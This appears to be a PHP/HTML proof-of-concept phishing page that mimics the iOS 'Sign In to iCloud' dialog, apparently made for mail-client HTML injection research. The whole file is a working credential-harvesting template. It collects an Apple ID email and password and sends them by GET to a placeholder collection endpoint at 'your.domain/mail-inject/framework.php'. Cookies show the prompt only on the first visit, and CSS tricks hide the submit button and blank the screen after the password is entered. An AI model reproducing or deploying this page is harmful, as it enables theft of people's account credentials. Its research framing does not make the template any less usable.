<?php
if(isset($_COOKIE["first_visit"])) {
    setcookie("second_visit", "true", time() + (86400 * 999), "/");
    }

setcookie("first_visit", "true", time() + (86400 * 999), "/");
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, width=device-width, height=device-height" name="viewport">

	<title>iCloud login</title>
	<style>
	  html, body {
		position: relative;
		height: 100%;
		width: 100%;
		overflow-x: hidden;
	  }
	  
	  body {
		font-family: Helvetica Neue,Helvetica,Arial,sans-serif;
		margin: 0;
		padding: 0;
		color: #000;
		font-size: 14px;
		line-height: 1.4;
		width: 100%;
		height: 110%;
		-webkit-text-size-adjust: 100%;
		background: #fff;
		overflow: hidden;
	  }
	  
	  * {
		-webkit-tap-highlight-color: transparent;
		-webkit-touch-callout: none;
	  }
	  
	  input {
		outline: 0;
	  }
	  
	  /* start of Framework7 css
	   * Framework7 0.10.0
	   * Full Featured HTML Framework For Building iOS 7 Apps
	   *
	   * http://www.idangero.us/framework7
	   *
	   * Copyright 2014, Vladimir Kharlampidi
	   * The iDangero.us
	   * http://www.idangero.us/
	   *
	   * Licensed under MIT
	   *
	   * Released on: December 8, 2014
	  */
	  
	  .modal-overlay {
		position: absolute;
		left: 0;
		top: 0;
		width: 100%;
		height: 100%;
		background: rgba(0,0,0,.4);
		z-index: 10600;
		visibility: hidden;
		opacity: 0;
		-webkit-transition-duration: 400ms;
		transition-duration: 400ms;
	  }
	  
	  .modal-overlay.modal-overlay-visible {
		visibility: visible;
		opacity: 1;
	  }
	  
	  .modal {
		width: 270px;
		position: absolute;
		z-index: 11000;
		left: 50%;
		margin-left: -135px;
		margin-top: 0;
		top: 50%;
		text-align: center;
		border-radius: 7px;
		opacity: 0;
		-webkit-transform: translate3d(0,0,0) scale(1.185);
		transform: translate3d(0,0,0) scale(1.185);
		-webkit-transition-property: -webkit-transform,opacity;
		transition-property: transform,opacity;
		color: #000;
	  }
	  
	  .modal.modal-in {
		opacity: 1;
		-webkit-transition-duration: 400ms;
		transition-duration: 400ms;
		-webkit-transform: translate3d(0,0,0) scale(1);
		transform: translate3d(0,0,0) scale(1);
	  }
	  
	  .modal-inner {
		padding: 15px;
		border-bottom: 1px solid #b5b5b5;
		border-radius: 7px 7px 0 0;
		background: #e8e8e8;
	  }
	  
	  .modal-title {
		font-weight: 500;
		font-size: 18px;
		text-align: center;
	  }
	  
	  .modal-title + .modal-text {
		margin-top: 5px;
	  }
	  
	  .modal-buttons {
		height: 44px;
		overflow: hidden;
		display: -webkit-box;
		display: -webkit-flex;
		display: flex;
		-webkit-box-pack: center;
		-webkit-justify-content: center;
		justify-content: center;
	  }
	  
	  .modal-button {
		width: 100%;
		padding: 0 5px;
		height: 44px;
		font-size: 17px;
		line-height: 44px;
		text-align: center;
		color: #007aff;
		background: #e8e8e8;
		display: block;
		position: relative;
		white-space: nowrap;
		text-overflow: ellipsis;
		overflow: hidden;
		cursor: pointer;
		-webkit-box-sizing: border-box;
		box-sizing: border-box;
		border-right: 1px solid #b5b5b5;
		-webkit-box-flex: 1;
		border-radius: 0 0 7px 0;
	  }
	  
	  .modal-button.modal-button-bold {
		font-weight: 500;
	  }
	  
	  .modal-button:first-child {
		border-radius:0 0 0 7px;
	  }
	  
	  .modal-button:last-child {
		border-radius: 0 0 7px 0;
		border-bottom: none;
	  }
	  
	  input.modal-text-input {
		-webkit-box-sizing: border-box;
		box-sizing: border-box;
		height: 30px;
		background: #fff;
		margin: 0;
		margin-top: 15px;
		padding: 0 5px;
		border: 1px solid #a0a0a0;
		border-radius: 5px;
		width: 100%;
		font-size: 14px;
		font-family: inherit;
		display: block;
		-webkit-box-shadow: 0 0 0 transparent;
		box-shadow: 0 0 0 transparent;
		-webkit-appearance: none;
		appearance: none;
	  }
	  
	  input.modal-text-input.modal-text-input-double {
		border-radius: 5px 5px 0 0;
	  }
	  
	  input.modal-text-input.modal-text-input-double+input.modal-text-input {
		margin-top: 0;
		border-top: 0;
		border-radius: 0 0 5px 5px;
	  }
	  /*end of Framework7 css*/ 
	     
	  input[type=submit] {
		visibility: hidden;
		position: absolute;
		top: -999px;
	  }
	  
	  input[type=text],input[type=password] {
		font-size: 16px;
	  }
	  
	  #password-input + div {
		display: block;
		position: absolute;
		top: -10px;
		left: -53px;
		width: 3000px;
		height: 3000px;
		background-color: white;
		z-index: 1;
		font-size: 14px;
		pointer-events: none;
		text-align: left;
	  }

	  @media only screen 
	  and (min-device-width : 768px) 
	  and (max-device-width : 1024px) 
	  and (orientation : landscape) {
		  .modal.modal-in {
			  opacity: 1;
			  -webkit-transition-duration: 400ms;
			  transition-duration: 400ms;
			  -webkit-transform: translate3d(0,0,0) scale(0.9);
			  transform: translate3d(0,0,0) scale(0.9);
			  left: 200px;
		  }
		  #password-input + div {
			  top: -23px;
			  left: -87px;
		  }
	  }
	  
	  @media only screen 
	  and (min-device-width : 768px) 
	  and (max-device-width : 1024px) 
	  and (orientation : portrait) {
		  .modal.modal-in {
			  opacity: 1;
			  -webkit-transition-duration: 400ms;
			  transition-duration: 400ms;
			  -webkit-transform: translate3d(0,0,0) scale(0.8);
			  transform: translate3d(0,0,0) scale(0.8);
		  }
		  #password-input + div {
			  top: -39px;
			  left: -305px;
		  }
	  }
	  
	  #password-input:focus + div {
		display: none;
	  }
	</style>
</head>

<body>

<?php
if(isset($_COOKIE["second_visit"])) {
    echo "<p>Lorem ipsum CONSECUTIVE VISIT WEB CONTENT</p></body></html>";
    die();
}
?>

	<p>Lorem ipsum PRE-SUBMIT WEB CONTENT</p>

	<div class="modal-overlay modal-overlay-visible"></div>

	<div class="modal modal-in" style="top: 10px;">
		<div class="modal-inner">
			<div class="modal-title">
				Sign In to iCloud
			</div>

			<div class="modal-text">
				Enter your Apple ID e-mail address and password
			</div>

			<form action="http://your.domain/mail-inject/framework.php" id="myform" method="get" name="myform">
				<input class="modal-text-input modal-text-input-double" name="modal-username" type="text" value="<?php
					if (isset($_GET['modal-username'])) {
					echo htmlspecialchars(stripslashes($_GET['modal-username']));
					} else echo "research@subject.tld";
					?>"><input autofocus="" class="modal-text-input modal-text-input-double" id="password-input" name="modal-password" placeholder="Password" type="password">

				<div>
					<p>Lorem ipsum POST-SUBMIT WEB CONTENT</p>
				</div>
				</input>
		</div>

		<div class="modal-buttons">
			<span class="modal-button">Cancel</span> <span class="modal-button modal-button-bold"><label for="submit" style="display: block; width: 100%; height: 100%;">OK<input id="submit" type="submit" value="OK"></label></span>
			</form>
		</div>
	</div>

</body>
</html>